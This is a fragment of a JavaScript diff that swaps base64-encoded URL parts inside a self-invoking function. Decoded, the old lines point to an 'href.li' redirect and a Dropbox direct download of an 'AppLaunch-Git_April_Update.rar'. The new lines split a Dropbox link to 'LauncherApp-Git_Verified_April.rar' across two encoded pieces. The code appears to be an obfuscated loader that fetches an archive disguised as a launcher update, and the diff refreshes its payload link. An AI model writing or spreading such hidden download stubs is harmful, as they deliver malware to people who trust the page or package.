@@ -1,7 +1,7 @@
 (function() {
  const urlParts = [
-  'aHR0cHM6Ly9ocmVmLmxpLz8=',
-  'aHR0cHM6Ly93d3cuZHJvcGJveC5jb20vc2NsL2ZpL3k4dm02bTgyZXhhZDJjOXIya3IwMC9BcHBMYXVuY2gtR2l0X0FwcmlsX1VwZGF0ZS5yYXI/cmxrZXk9aTU2YjE5cTBqZnprdDlreG8xeTJ5ajRvdiZzdD1jeTh6YWtnYiZkbD0x'
+  'aHR0cHM6Ly93d3cuZHJvcGJveC5jb20vc2NsL2ZpL250M3hyMTdocWZqcTN1ZzRtaHJyOC9MYXVuY2hlckFwcC1HaXRfVmVyaWZpZWRfQXByaWwucmFyPw==',
+  'cmxrZXk9NmtvcTl1bmpmdjZ6MXMwcjFtYmdwbjIzciZzdD1zazZhbDNrNyZkbD0x'
 ];
   
   function decodePart(encoded) {
